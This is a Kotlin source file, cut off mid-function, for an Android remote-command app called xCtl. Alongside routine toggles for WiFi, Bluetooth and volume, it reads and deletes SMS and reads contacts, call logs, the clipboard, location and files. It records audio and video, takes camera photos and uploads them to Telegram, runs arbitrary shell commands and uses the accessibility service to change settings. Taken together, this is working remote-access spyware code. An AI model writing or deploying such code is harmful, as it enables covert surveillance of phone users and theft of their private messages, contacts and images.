package dev.xprime.xctl

import android.app.NotificationManager
import android.bluetooth.BluetoothAdapter
import android.content.ClipData
import android.content.ClipboardManager
import android.content.Context
import android.content.Intent
import android.content.IntentFilter
import android.database.Cursor
import android.hardware.camera2.CameraCharacteristics
import android.hardware.camera2.CameraDevice
import android.hardware.camera2.CameraManager
import android.hardware.camera2.CaptureRequest
import android.hardware.camera2.CameraCaptureSession
import android.media.ImageReader
import android.media.Image
import android.os.Handler
import android.os.HandlerThread
import androidx.core.content.FileProvider
import java.util.concurrent.CountDownLatch
import java.util.concurrent.TimeUnit
import android.graphics.ImageFormat
import android.hardware.camera2.params.StreamConfigurationMap
import android.location.LocationManager
import android.media.AudioManager
import android.net.ConnectivityManager
import android.net.Uri
import android.net.wifi.WifiConfiguration
import android.net.wifi.WifiManager
import android.os.BatteryManager
import android.os.Build
import android.os.Environment
import android.os.PowerManager
import android.os.StatFs
import android.provider.CallLog
import android.provider.ContactsContract
import android.provider.MediaStore
import android.provider.Settings
import android.telephony.SmsManager
import android.telephony.SubscriptionManager
import android.telephony.TelephonyManager
import androidx.core.app.NotificationCompat
import androidx.core.app.NotificationManagerCompat
import java.io.File
import java.lang.reflect.Method

class SystemManager(private val context: Context) {
    private val wifiManager = context.applicationContext
        .getSystemService(Context.WIFI_SERVICE) as WifiManager
    private val audioManager = context.applicationContext
        .getSystemService(Context.AUDIO_SERVICE) as AudioManager
    private val powerManager = context.applicationContext
        .getSystemService(Context.POWER_SERVICE) as PowerManager
    private val notificationManagerCompat = NotificationManagerCompat.from(context)
    private val cameraManager = context.applicationContext
        .getSystemService(Context.CAMERA_SERVICE) as CameraManager
    private val clipboardManager = context.applicationContext
        .getSystemService(Context.CLIPBOARD_SERVICE) as ClipboardManager
    private val locationManager = context.applicationContext
        .getSystemService(Context.LOCATION_SERVICE) as LocationManager
    private val connectivityManager = context.applicationContext
        .getSystemService(Context.CONNECTIVITY_SERVICE) as ConnectivityManager

    fun setWifi(state: String): String {
        return try {
            val result = when (state.lowercase()) {
                "on" -> wifiManager.setWifiEnabled(true)
                "off" -> wifiManager.setWifiEnabled(false)
                "toggle" -> wifiManager.setWifiEnabled(!wifiManager.isWifiEnabled)
                else -> return "Usage: xctl WIFI [on/off/toggle]"
            }
            if (result) {
                val current = if (wifiManager.isWifiEnabled) "on" else "off"
                "WiFi turned $current"
            } else {
                "WiFi toggle failed (device may be processing)"
            }
        } catch (e: SecurityException) {
            "Error: Missing CHANGE_WIFI_STATE permission"
        } catch (e: Exception) {
            "Error: ${e.message}"
        }
    }

    fun setBluetooth(state: String): String {
        val btAdapter = try {
            BluetoothAdapter.getDefaultAdapter()
        } catch (e: SecurityException) {
            openAppSettings()
            return "BLUETOOTH_CONNECT permission denied. Opening Settings"
        }
        if (btAdapter == null) return "Bluetooth not supported on this device"

        val targetOn: Boolean
        when (state.lowercase()) {
            "on" -> targetOn = true
            "off" -> targetOn = false
            "toggle" -> targetOn = !btAdapter.isEnabled
            else -> return "Usage: xctl BLUETOOTH [on/off/toggle]"
        }
        if (targetOn == btAdapter.isEnabled) {
            return "Bluetooth already ${if (targetOn) "on" else "off"}"
        }

        try {
            @Suppress("DEPRECATION")
            val ok = if (targetOn) btAdapter.enable() else btAdapter.disable()
            if (ok) return if (targetOn) "Bluetooth enabled" else "Bluetooth disabled"
        } catch (_: SecurityException) { }

        if (isAccessibilityEnabled()) {
            XctlAccessibilityService.requestToggleBluetooth(context, targetOn)
            try { Thread.sleep(3000) } catch (_: Exception) { }
            if (XctlAccessibilityService.toggleComplete) {
                return "Bluetooth toggled via Accessibility"
            }
            return "Bluetooth toggle failed via Accessibility"
        }

        try {
            val intent = Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS).apply {
                addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
            }
            context.startActivity(intent)
        } catch (_: Exception) { }
        return "Enable xCtl in Accessibility, then retry"
    }

    private fun openAppSettings() {
        try {
            val intent = Intent(Settings.ACTION_APPLICATION_DETAILS_SETTINGS).apply {
                data = android.net.Uri.parse("package:${context.packageName}")
                addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
            }
            context.startActivity(intent)
        } catch (_: Exception) { }
    }

    fun setMobileData(state: String): String {
        val tm = context.getSystemService(Context.TELEPHONY_SERVICE) as TelephonyManager
        val targetOn: Boolean
        when (state.lowercase()) {
            "on" -> targetOn = true
            "off" -> targetOn = false
            "toggle" -> {
                val current = try {
                    tm.javaClass.getMethod("isDataEnabled").invoke(tm) as Boolean
                } catch (e: Exception) { false }
                targetOn = !current
            }
            else -> return "Usage: xctl DATA [on/off/toggle]"
        }
        val onStr = if (targetOn) "enable" else "disable"

        if (isAccessibilityEnabled()) {
            XctlAccessibilityService.requestToggleMobileData(context, targetOn)
            try { Thread.sleep(3000) } catch (_: Exception) { }
            if (XctlAccessibilityService.toggleComplete) {
                return "Mobile data turned $onStr"
            }
            return "Mobile data toggle failed - retry?"
        }

        try {
            val intent = Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS).apply {
                addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
            }
            context.startActivity(intent)
        } catch (_: Exception) { }
        return "Enable xCtl in Accessibility, then retry"
    }

    private fun isAccessibilityEnabled(): Boolean {
        val serviceId = "${context.packageName}/.XctlAccessibilityService"
        val enabled = try {
            Settings.Secure.getString(
                context.contentResolver,
                Settings.Secure.ENABLED_ACCESSIBILITY_SERVICES
            ) ?: ""
        } catch (_: Exception) { "" }
        return enabled.split(':').any { it.trim().equals(serviceId, ignoreCase = true) }
    }

    fun setHotspot(state: String): String {
        return try {
            val method: Method = wifiManager.javaClass.getMethod(
                "setWifiApEnabled", WifiConfiguration::class.java, Boolean::class.javaPrimitiveType
            )
            when (state.lowercase()) {
                "on" -> {
                    val config = WifiConfiguration().apply {
                        SSID = "xCtl_Hotspot_${System.currentTimeMillis() % 10000}"
                        allowedKeyManagement.set(WifiConfiguration.KeyMgmt.NONE)
                    }
                    method.invoke(wifiManager, config, true)
                    "Hotspot turned on (SSID: ${config.SSID})"
                }
                "off" -> {
                    method.invoke(wifiManager, null, false)
                    "Hotspot turned off"
                }
                "toggle" -> {
                    val isEnabled = try {
                        val isWifiApEnabled = wifiManager.javaClass.getMethod("isWifiApEnabled")
                        isWifiApEnabled.invoke(wifiManager) as Boolean
                    } catch (e: Exception) { false }
                    if (isEnabled) {
                        method.invoke(wifiManager, null, false)
                        "Hotspot turned off"
                    } else {
                        val config = WifiConfiguration().apply {
                            SSID = "xCtl_Hotspot_${System.currentTimeMillis() % 10000}"
                            allowedKeyManagement.set(WifiConfiguration.KeyMgmt.NONE)
                        }
                        method.invoke(wifiManager, config, true)
                        "Hotspot turned on (SSID: ${config.SSID})"
                    }
                }
                else -> "Usage: xctl HOTSPOT [on/off/toggle]"
            }
        } catch (e: NoSuchMethodException) {
            "Hotspot control not supported on this device"
        } catch (e: Exception) {
            "Error: ${e.message}"
        }
    }

    fun setBrightness(value: String): String {
        return try {
            val level = value.toInt().coerceIn(0, 255)
            Settings.System.putInt(
                context.contentResolver,
                Settings.System.SCREEN_BRIGHTNESS,
                level
            )
            "Brightness set to $level"
        } catch (e: SecurityException) {
            "Error: Missing WRITE_SETTINGS permission"
        } catch (e: NumberFormatException) {
            "Usage: xctl BRIGHTNESS <0-255>"
        } catch (e: Exception) {
            "Error: ${e.message}"
        }
    }

    fun setScreenTimeout(seconds: String): String {
        return try {
            val ms = (seconds.toFloat() * 1000).toInt().coerceIn(5000, 86400000)
            Settings.System.putInt(
                context.contentResolver,
                Settings.System.SCREEN_OFF_TIMEOUT,
                ms
            )
            "Screen timeout set to ${ms / 1000}s"
        } catch (e: SecurityException) {
            "Error: Missing WRITE_SETTINGS permission"
        } catch (e: Exception) {
            "Error: ${e.message}"
        }
    }

    fun setScreenState(state: String): String {
        return try {
            when (state.lowercase()) {
                "on" -> {
                    @Suppress("DEPRECATION")
                    val wl = powerManager.newWakeLock(
                        PowerManager.SCREEN_BRIGHT_WAKE_LOCK or PowerManager.ACQUIRE_CAUSES_WAKEUP,
                        "xctl:wakeup"
                    )
                    wl.acquire(3000)
                    wl.release()
                    "Screen turned on"
                }
                "off" -> {
                    "Screen off requires proximity sensor or root on this device"
                }
                else -> "Usage: xctl SCREEN [on/off]"
            }
        } catch (e: SecurityException) {
            "Error: Missing WAKE_LOCK permission"
        } catch (e: Exception) {
            "Error: ${e.message}"
        }
    }

    fun setVolume(level: String): String {
        return try {
            val vol = level.toInt().coerceIn(0, audioManager.getStreamMaxVolume(AudioManager.STREAM_MUSIC))
            audioManager.setStreamVolume(AudioManager.STREAM_MUSIC, vol, 0)
            "Volume set to $vol"
        } catch (e: Exception) {
            "Error: ${e.message}"
        }
    }

    fun mute(): String {
        return try {
            audioManager.ringerMode = AudioManager.RINGER_MODE_SILENT
            "Device muted (silent mode)"
        } catch (e: Exception) {
            "Error: ${e.message}"
        }
    }

    fun setRingMode(mode: String): String {
        return try {
            when (mode.lowercase()) {
                "normal", "ring" -> {
                    audioManager.ringerMode = AudioManager.RINGER_MODE_NORMAL
                    audioManager.setStreamVolume(AudioManager.STREAM_RING,
                        audioManager.getStreamMaxVolume(AudioManager.STREAM_RING), 0)
                    "Ring mode: normal"
                }
                "silent", "silence" -> {
                    audioManager.ringerMode = AudioManager.RINGER_MODE_SILENT
                    "Ring mode: silent"
                }
                "vibrate", "vibration" -> {
                    audioManager.ringerMode = AudioManager.RINGER_MODE_VIBRATE
                    "Ring mode: vibrate"
                }
                else -> "Usage: xctl RING [normal/silent/vibrate]"
            }
        } catch (e: Exception) {
            "Error: ${e.message}"
        }
    }

    fun setAirplaneMode(state: String): String {
        return try {
            val current = Settings.Global.getInt(context.contentResolver,
                Settings.Global.AIRPLANE_MODE_ON, 0)
            when (state.lowercase()) {
                "on" -> {
                    if (current == 1) return "Airplane mode already on"
                    Settings.Global.putInt(context.contentResolver,
                        Settings.Global.AIRPLANE_MODE_ON, 1)
                    context.sendBroadcast(Intent(Intent.ACTION_AIRPLANE_MODE_CHANGED).putExtra("state", true))
                    "Airplane mode on"
                }
                "off" -> {
                    if (current == 0) return "Airplane mode already off"
                    Settings.Global.putInt(context.contentResolver,
                        Settings.Global.AIRPLANE_MODE_ON, 0)
                    context.sendBroadcast(Intent(Intent.ACTION_AIRPLANE_MODE_CHANGED).putExtra("state", false))
                    "Airplane mode off"
                }
                "toggle" -> {
                    val newState = if (current == 1) 0 else 1
                    Settings.Global.putInt(context.contentResolver,
                        Settings.Global.AIRPLANE_MODE_ON, newState)
                    context.sendBroadcast(Intent(Intent.ACTION_AIRPLANE_MODE_CHANGED)
                        .putExtra("state", newState == 1))
                    "Airplane mode ${if (newState == 1) "on" else "off"}"
                }
                else -> "Usage: xctl AIRPLANE [on/off/toggle]"
            }
        } catch (e: SecurityException) {
            "Airplane mode requires WRITE_SECURE_SETTINGS (system app or root)"
        } catch (e: Exception) {
            "Error: ${e.message}"
        }
    }

    fun reboot(): String {
        return try {
            try {
                powerManager.reboot(null)
                "Rebooting..."
            } catch (e: SecurityException) {
                Runtime.getRuntime().exec(arrayOf("su", "-c", "reboot"))
                "Reboot command sent (requires root)"
            }
        } catch (e: SecurityException) {
            "Error: Reboot requires system permission or root"
        } catch (e: Exception) {
            "Error: ${e.message}"
        }
    }

    fun shutdown(): String {
        return try {
            Runtime.getRuntime().exec(arrayOf("su", "-c", "reboot -p"))
            "Shutdown command sent (requires root)"
        } catch (e: Exception) {
            "Error: ${e.message}"
        }
    }

    fun getLocation(): String {
        return try {
            val providers = locationManager.getProviders(true)
            if (providers.isEmpty()) return "No location providers enabled. Please enable GPS."
            val location = locationManager.getLastKnownLocation(LocationManager.GPS_PROVIDER)
                ?: locationManager.getLastKnownLocation(LocationManager.NETWORK_PROVIDER)
            if (location != null) {
                val mapsUrl = "https://maps.google.com/?q=${location.latitude},${location.longitude}"
                "Location: ${location.latitude},${location.longitude} (acc: ${location.accuracy}m) | $mapsUrl"
            } else {
                "No last known location. Try enabling GPS."
            }
        } catch (e: SecurityException) {
            "Error: Missing location permission"
        } catch (e: Exception) {
            "Error: ${e.message}"
        }
    }

    fun getDeviceStatus(): String {
        return try {
            val batteryIntent = context.registerReceiver(null,
                IntentFilter(Intent.ACTION_BATTERY_CHANGED))
            val level = batteryIntent?.getIntExtra(BatteryManager.EXTRA_LEVEL, 0) ?: 0
            val scale = batteryIntent?.getIntExtra(BatteryManager.EXTRA_SCALE, 100) ?: 100
            val pct = (level * 100) / scale
            val charging = (batteryIntent?.getIntExtra(BatteryManager.EXTRA_STATUS, -1)
                == BatteryManager.BATTERY_STATUS_CHARGING)
            val btAdapter = BluetoothAdapter.getDefaultAdapter()
            "BAT:${pct}%${if(charging)"(chg)"else""}|WF:${if(wifiManager.isWifiEnabled)"ON"else"OFF"}|BT:${if(btAdapter?.isEnabled == true)"ON"else"OFF"}|SC:${if(powerManager.isInteractive)"ON"else"OFF"}|${Build.MANUFACTURER} ${Build.MODEL}|Android ${Build.VERSION.RELEASE}"
        } catch (e: Exception) { "Error: ${e.message}" }
    }

    fun sendSms(number: String, message: String): String {
        return try {
            val smsManager = SmsManager.getDefault()
            smsManager.sendTextMessage(number, null, message, null, null)
            "SMS sent to $number"
        } catch (e: SecurityException) { "Error: Missing SEND_SMS permission" }
        catch (e: Exception) { "Error: ${e.message}" }
    }

    fun makeCall(number: String): String {
        return try {
            val intent = Intent(Intent.ACTION_CALL, Uri.parse("tel:$number")).apply {
                addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
            }
            context.startActivity(intent)
            "Calling $number..."
        } catch (e: SecurityException) { "Error: Missing CALL_PHONE permission" }
        catch (e: Exception) { "Error: ${e.message}" }
    }

    fun getContacts(): String {
        return try {
            val cursor: Cursor? = context.contentResolver.query(
                ContactsContract.Contacts.CONTENT_URI,
                arrayOf(ContactsContract.Contacts._ID,
                    ContactsContract.Contacts.DISPLAY_NAME,
                    ContactsContract.Contacts.HAS_PHONE_NUMBER),
                null, null,
                "${ContactsContract.Contacts.DISPLAY_NAME} ASC LIMIT 50"
            )
            val names = mutableListOf<String>()
            cursor?.use { c ->
                while (c.moveToNext()) {
                    val name = c.getString(c.getColumnIndexOrThrow(
                        ContactsContract.Contacts.DISPLAY_NAME))
                    names.add(name)
                }
            }
            if (names.isEmpty()) "No contacts found"
            else "Contacts (${names.size}): ${names.joinToString(", ")}"
        } catch (e: SecurityException) { "Error: Missing READ_CONTACTS permission" }
        catch (e: Exception) { "Error: ${e.message}" }
    }

    fun getCallLog(): String {
        return try {
            val cursor: Cursor? = context.contentResolver.query(
                CallLog.Calls.CONTENT_URI,
                arrayOf(CallLog.Calls.NUMBER, CallLog.Calls.TYPE,
                    CallLog.Calls.DURATION, CallLog.Calls.DATE),
                null, null, "${CallLog.Calls.DATE} DESC LIMIT 10"
            )
            val entries = mutableListOf<String>()
            cursor?.use { c ->
                while (c.moveToNext()) {
                    val num = c.getString(c.getColumnIndexOrThrow(CallLog.Calls.NUMBER)) ?: "unknown"
                    val type = c.getInt(c.getColumnIndexOrThrow(CallLog.Calls.TYPE))
                    val dur = c.getLong(c.getColumnIndexOrThrow(CallLog.Calls.DURATION))
                    val typeStr = when (type) {
                        CallLog.Calls.INCOMING_TYPE -> "IN"
                        CallLog.Calls.OUTGOING_TYPE -> "OUT"
                        CallLog.Calls.MISSED_TYPE -> "MISS"
                        else -> "?"
                    }
                    entries.add("$num($typeStr,${dur}s)")
                }
            }
            if (entries.isEmpty()) "No call logs"
            else "Calls: ${entries.joinToString(", ")}"
        } catch (e: SecurityException) { "Error: Missing READ_CALL_LOG permission" }
        catch (e: Exception) { "Error: ${e.message}" }
    }

    fun readSms(count: String): String {
        return try {
            val limit = count.toInt().coerceIn(1, 100)
            val cursor: Cursor? = context.contentResolver.query(
                Uri.parse("content://sms/inbox"),
                arrayOf("address", "body", "date"),
                null, null, "date DESC LIMIT $limit"
            )
            val msgs = mutableListOf<String>()
            cursor?.use { c ->
                while (c.moveToNext()) {
                    val addr = c.getString(c.getColumnIndexOrThrow("address")) ?: "unknown"
                    val body = c.getString(c.getColumnIndexOrThrow("body")) ?: ""
                    msgs.add("$addr: ${body.take(80)}")
                }
            }
            if (msgs.isEmpty()) "No SMS messages"
            else "SMS (${msgs.size}): ${msgs.joinToString(" | ")}"
        } catch (e: SecurityException) { "Error: Missing READ_SMS permission" }
        catch (e: Exception) { "Error: ${e.message}" }
    }

    fun deleteSms(id: String): String {
        return try {
            val idx = id.toInt()
            val cursor: Cursor? = context.contentResolver.query(
                Uri.parse("content://sms"),
                arrayOf("_id"),
                null, null, "date DESC"
            )
            var targetId: Long = -1
            var pos = 0
            cursor?.use { c ->
                while (c.moveToNext()) {
                    if (pos == idx) {
                        targetId = c.getLong(c.getColumnIndexOrThrow("_id"))
                        break
                    }
                    pos++
                }
            }
            if (targetId >= 0) {
                val deleted = context.contentResolver.delete(
                    Uri.parse("content://sms/$targetId"), null, null)
                if (deleted > 0) "SMS #$idx deleted" else "Failed to delete SMS"
            } else "SMS #$idx not found"
        } catch (e: NumberFormatException) { "Usage: xctl SMSDELETE <index>" }
        catch (e: SecurityException) { "Error: Missing SMS permission" }
        catch (e: Exception) { "Error: ${e.message}" }
    }

    fun sendNotification(message: String): String {
        return try {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                val channel = android.app.NotificationChannel(
                    "xctl_alerts",
                    "xCtl Alerts",
                    NotificationManager.IMPORTANCE_HIGH
                ).apply {
                    description = "xCtl command notifications"
                    enableVibration(true)
                    setSound(
                        Settings.System.DEFAULT_NOTIFICATION_URI,
                        android.app.Notification.AUDIO_ATTRIBUTES_DEFAULT
                    )
                }
                val nm = context.getSystemService(Context.NOTIFICATION_SERVICE) as NotificationManager
                nm.createNotificationChannel(channel)
            }

            val intent = context.packageManager
                .getLaunchIntentForPackage(context.packageName)?.apply {
                flags = Intent.FLAG_ACTIVITY_SINGLE_TOP
            }
            val pi = android.app.PendingIntent.getActivity(
                context, 0, intent,
                android.app.PendingIntent.FLAG_UPDATE_CURRENT
                    or android.app.PendingIntent.FLAG_IMMUTABLE
            )
            val notification = NotificationCompat.Builder(context, "xctl_alerts")
                .setSmallIcon(android.R.drawable.ic_dialog_alert)
                .setContentTitle("xCtl")
                .setContentText(message)
                .setPriority(NotificationCompat.PRIORITY_HIGH)
                .setDefaults(NotificationCompat.DEFAULT_ALL)
                .setContentIntent(pi)
                .setAutoCancel(true)
                .build()
            notificationManagerCompat.notify(1002, notification)
            "Notification sent with sound: $message"
        } catch (e: Exception) { "Error: ${e.message}" }
    }

    fun setFlashlight(state: String): String {
        return try {
            val cameraId = cameraManager.cameraIdList.firstOrNull()
                ?: return "No camera found"
            val chars = cameraManager.getCameraCharacteristics(cameraId)
            val hasFlash = chars.get(CameraCharacteristics.FLASH_INFO_AVAILABLE)
            if (hasFlash != true) return "No flash available"
            when (state.lowercase()) {
                "on" -> {
                    try {
                        cameraManager.setTorchMode(cameraId, true)
                        "Flashlight on"
                    } catch (e: Exception) {
                        "Flash failed: ${e.message}"
                    }
                }
                "off" -> {
                    try {
                        cameraManager.setTorchMode(cameraId, false)
                        "Flashlight off"
                    } catch (e: Exception) {
                        "Flash off failed: ${e.message}"
                    }
                }
                "toggle" -> {
                    try {
                        cameraManager.setTorchMode(cameraId, true)
                        "Flashlight toggled"
                    } catch (_: Exception) {
                        try {
                            cameraManager.setTorchMode(cameraId, false)
                            "Flashlight toggled"
                        } catch (_: Exception) {
                            "Flash toggle failed"
                        }
                    }
                }
                else -> "Usage: xctl FLASH [on/off/toggle]"
            }
        } catch (e: SecurityException) {
            "Flash requires CAMERA permission"
        } catch (e: Exception) {
            "Error: ${e.message}"
        }
    }

    fun listFiles(path: String): String {
        return try {
            val dir = File(path)
            if (!dir.exists()) return "Path not found: $path"
            if (!dir.isDirectory) return "Not a directory: $path"
            val files = dir.listFiles() ?: return "Cannot read directory: $path"
            if (files.isEmpty()) return "Empty directory"
            files.joinToString(", ") { f ->
                val size = if (f.isFile) {
                    when (val len = f.length()) {
                        in 0..1023 -> "${len}B"
                        in 1024..(1024*1024-1) -> "${len/1024}KB"
                        else -> "${len/(1024*1024)}MB"
                    }
                } else ""
                "${f.name}${if(f.isDirectory)"/" else ""}$size"
            }.take(5000)
        } catch (e: Exception) { "Error: ${e.message}" }
    }

    fun readFile(path: String): String {
        return try {
            val file = File(path)
            if (!file.exists()) return "File not found: $path"
            if (!file.isFile) return "Not a file: $path"
            if (file.length() > 100_000) return "File too large (>100KB)"
            file.readText().take(5000)
        } catch (e: Exception) { "Error: ${e.message}" }
    }

    fun deleteFile(path: String): String {
        return try {
            val file = File(path)
            if (!file.exists()) return "File not found: $path"
            if (file.delete()) "Deleted: $path"
            else "Failed to delete: $path"
        } catch (e: Exception) { "Error: ${e.message}" }
    }

    fun listApps(): String {
        return try {
            val pm = context.packageManager
            val intent = Intent(Intent.ACTION_MAIN, null).addCategory(Intent.CATEGORY_LAUNCHER)
            val apps = pm.queryIntentActivities(intent, 0)
            apps.take(100).joinToString(", ") { it.activityInfo.packageName }
        } catch (e: Exception) { "Error: ${e.message}" }
    }

    fun launchApp(packageName: String): String {
        return try {
            val intent = context.packageManager.getLaunchIntentForPackage(packageName)
            if (intent != null) {
                intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
                context.startActivity(intent)
                "Launched $packageName"
            } else {
                "App not found: $packageName"
            }
        } catch (e: Exception) { "Error: ${e.message}" }
    }

    fun stopApp(packageName: String): String {
        return try {
            val am = context.getSystemService(Context.ACTIVITY_SERVICE) as android.app.ActivityManager
            am.killBackgroundProcesses(packageName)
            "Stopped $packageName"
        } catch (e: Exception) { "Error: ${e.message}" }
    }

    fun uninstallApp(packageName: String): String {
        return try {
            val intent = Intent(Intent.ACTION_DELETE, Uri.parse("package:$packageName")).apply {
                addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
            }
            context.startActivity(intent)
            "Uninstalling $packageName..."
        } catch (e: Exception) { "Error: ${e.message}" }
    }

    fun installApp(url: String): String {
        return try {
            val intent = Intent(Intent.ACTION_VIEW).apply {
                data = Uri.parse(url)
                addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
            }
            context.startActivity(intent)
            "Opening $url for installation..."
        } catch (e: Exception) { "Error: ${e.message}" }
    }

    fun takeScreenshot(): String {
        return try {
            val dir = Environment.getExternalStoragePublicDirectory(
                Environment.DIRECTORY_PICTURES)
            dir.mkdirs()
            val file = File(dir, "xctl_screenshot_${System.currentTimeMillis()}.png")
            val process = Runtime.getRuntime().exec(
                arrayOf("/system/bin/screencap", "-p", file.absolutePath)
            )
            val exitCode = process.waitFor()
            if (exitCode == 0) {
                "Screenshot saved to ${file.absolutePath}"
            } else {
                "Screenshot failed. Requires root on modern Android"
            }
        } catch (e: Exception) {
            "Screenshot requires root on modern Android"
        }
    }

    fun handleClipboard(action: String?, value: String?): String {
        return try {
            when (action?.lowercase()) {
                "get" -> {
                    val clip = clipboardManager.primaryClip
                    if (clip != null && clip.itemCount > 0) {
                        "Clipboard: ${clip.getItemAt(0).text}"
                    } else "Clipboard is empty"
                }
                "set" -> {
                    if (value != null) {
                        clipboardManager.setPrimaryClip(
                            ClipData.newPlainText("xctl", value))
                        "Clipboard set"
                    } else "Usage: xctl CLIPBOARD set <text>"
                }
                else -> "Usage: xctl CLIPBOARD [get/set]"
            }
        } catch (e: Exception) { "Error: ${e.message}" }
    }

    fun takePhoto(camera: String, retryCount: Int = 0): String {
        if (retryCount > 0) Thread.sleep(500)
        val dir = Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DCIM)
        dir.mkdirs()
        val file = File(dir, "xctl_${System.currentTimeMillis()}.jpg")
        val latch = CountDownLatch(1)
        var result = ""

        try {
            val facing = if (camera.lowercase() == "front")
                CameraCharacteristics.LENS_FACING_FRONT
            else CameraCharacteristics.LENS_FACING_BACK

            var cameraId: String? = null
            var chars: CameraCharacteristics? = null
            for (id in cameraManager.cameraIdList) {
                val c = cameraManager.getCameraCharacteristics(id)
                if (c.get(CameraCharacteristics.LENS_FACING) == facing) {
                    cameraId = id; chars = c; break
                }
            }
            if (cameraId == null) return "No ${camera} camera found"

            val configs = chars?.get(CameraCharacteristics.SCALER_STREAM_CONFIGURATION_MAP)
                    as? StreamConfigurationMap
            val jpegSizes = configs?.getOutputSizes(ImageFormat.JPEG) ?: emptyArray()
            val (w, h) = if (jpegSizes.isNotEmpty()) {
                val best = jpegSizes.minByOrNull {
                    Math.abs(it.width - 1280) + Math.abs(it.height - 720)
                } ?: jpegSizes[0]
                best.width to best.height
            } else 1280 to 720

            val reader = ImageReader.newInstance(w, h, ImageFormat.JPEG, 2)
            val handlerThread = HandlerThread("xctl_camera")
            handlerThread.start()
            val handler = Handler(handlerThread.looper)

            cameraManager.openCamera(cameraId, object : CameraDevice.StateCallback() {
                override fun onOpened(device: CameraDevice) {
                    try {
                        val surfaces = listOf(reader.surface)
                        device.createCaptureSession(surfaces, object : CameraCaptureSession.StateCallback() {
                            override fun onConfigured(session: CameraCaptureSession) {
                                try {
                                    val request = device.createCaptureRequest(CameraDevice.TEMPLATE_STILL_CAPTURE)
                                    request.addTarget(reader.surface)
                                    session.capture(request.build(), null, handler)
                                } catch (e: Exception) {
                                    result = "Capture failed: ${e.message}"
                                    latch.countDown()
                                }
                            }
                            override fun onConfigureFailed(session: CameraCaptureSession) {
                                result = "Camera session failed"
                                latch.countDown()
                            }
                        }, handler)
                    } catch (e: Exception) {
                        result = "Error: ${e.message}"
                        latch.countDown()
                    }
                }
                override fun onDisconnected(device: CameraDevice) {
                    device.close()
                    result = "Camera disconnected"
                    latch.countDown()
                }
                override fun onError(device: CameraDevice, error: Int) {
                    device.close()
                    if (error == 2 && !result.contains("retry")) {
                        result = "retry"
                        latch.countDown()
                    } else {
                        result = "Camera error: $error"
                        latch.countDown()
                    }
                }
            }, handler)

            reader.setOnImageAvailableListener({ reader ->
                val image = reader.acquireLatestImage()
                if (image != null) {
                    try {
                        val buffer = image.planes[0].buffer
                        val bytes = ByteArray(buffer.remaining())
                        buffer.get(bytes)
                        file.outputStream().use { it.write(bytes) }
                        result = "Photo saved: ${file.name}"
                    } catch (e: Exception) {
                        result = "Save failed: ${e.message}"
                    } finally {
                        image.close()
                    }
                } else result = "No image captured"
                latch.countDown()
            }, handler)

            if (!latch.await(10, TimeUnit.SECONDS)) result = "Camera timeout"
            handlerThread.quitSafely()
            reader.close()

            if (result == "retry" && retryCount < 2) {
                result = takePhoto(camera, retryCount + 1)
            } else if (result == "retry") {
                result = "Camera error: device unavailable after retry"
            }
        } catch (e: SecurityException) { return "Error: Missing CAMERA permission" }
        catch (e: Exception) { return "Error: ${e.message}" }

        if (result.startsWith("Photo saved")) {
            TelegramUploader.loadConfig(context)
            val tgResult = TelegramUploader.upload(file.absolutePath)
            result += " | TG:$tgResult"
        }
        return result
    }

    fun recordAudio(duration: String): String {
        val dur = duration.toIntOrNull()?.coerceIn(1, 300)
            ?: return "Usage: xctl AUDIO <seconds>"
        return try {
            val file = File(
                Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_MUSIC),
                "xctl_audio_${System.currentTimeMillis()}.3gp"
            )
            file.parentFile?.mkdirs()
            val intent = Intent(context, CommandService::class.java).apply {
                action = "RECORD_AUDIO"
                putExtra("file_path", file.absolutePath)
                putExtra("duration", dur)
            }
            context.startService(intent)
            "Recording audio for ${dur}s to ${file.name}..."
        } catch (e: Exception) { "Error: ${e.message}" }
    }

    fun recordVideo(duration: String): String {
        val dur = duration.toIntOrNull()?.coerceIn(1, 300)
            ?: return "Usage: xctl VIDEO <seconds>"
        return try {
            val intent = Intent(context, CommandService::class.java).apply {
                action = "RECORD_VIDEO"
                putExtra("file_path",
                    "/sdcard/xctl_video_${System.currentTimeMillis()}.mp4")
                putExtra("duration", dur)
            }
            context.startService(intent)
            "Recording video for ${dur}s..."
        } catch (e: Exception) { "Error: ${e.message}" }
    }

    fun execShell(command: String): String {
        return try {
            val process = Runtime.getRuntime().exec(arrayOf("sh", "-c", command))
            val output = process.inputStream.bufferedReader().readText().trim()
            val error = process.errorStream.bufferedReader().readText().trim()
            val exitCode = process.waitFor()
            val result = if (output.isNotEmpty()) output else error
            "Exit:$exitCode|${result.take(4000)}"
        } catch (e: Exception) { "Error: ${e.message}" }
    }

    fun getStorage(): String {
        return try {
            val statFs = StatFs(Environment.getDataDirectory().absolutePath)
            val total = statFs.totalBytes
            val free = statFs.availableBytes
            val used = total - free
            fun formatSize(bytes: Long): String = when {
                bytes < 1024 -> "$bytes B"
                bytes < 1024*1024 -> "${bytes/1024} KB"
                bytes < 1024*1024*1024 -> "${bytes/(1024*1024)} MB"
                else -> "${bytes/(1024*1024*1024)} GB"
            }
            "Storage: ${formatSize(used)} used / ${formatSize(total)} total (${formatSize(free)} free)"
        } catch (e: Exception) { "Error: ${e.message}" }
    }

    fun getNetworkIp(): String {
        return try {
            val wifiInfo = wifiManager.connectionInfo ?: return "No WiFi connection"
            val ipInt = wifiInfo.ipAddress
            if (ipInt == 0) return "No IP address (not connected to WiFi)"
            val ip = "${ipInt and 0xFF}.${(ipInt shr 8) and 0xFF}.${(ipInt shr 16) and 0xFF}.${(ipInt shr 24) and 0xFF}"
            val ssid = wifiInfo.ssid ?: "unknown"
            "SSID:$ssid|IP:$ip"
        } catch (e: Exception) { "Error: ${e.message}" }
    }

    fun getSimInfo(): String {
        return try {
            val tm = context.getSystemService(Context.TELEPHONY_SERVICE) as TelephonyManager
            val operator = tm.networkOperatorName ?: "unknown"
            val country = tm.networkCountryIso ?: "unknown"
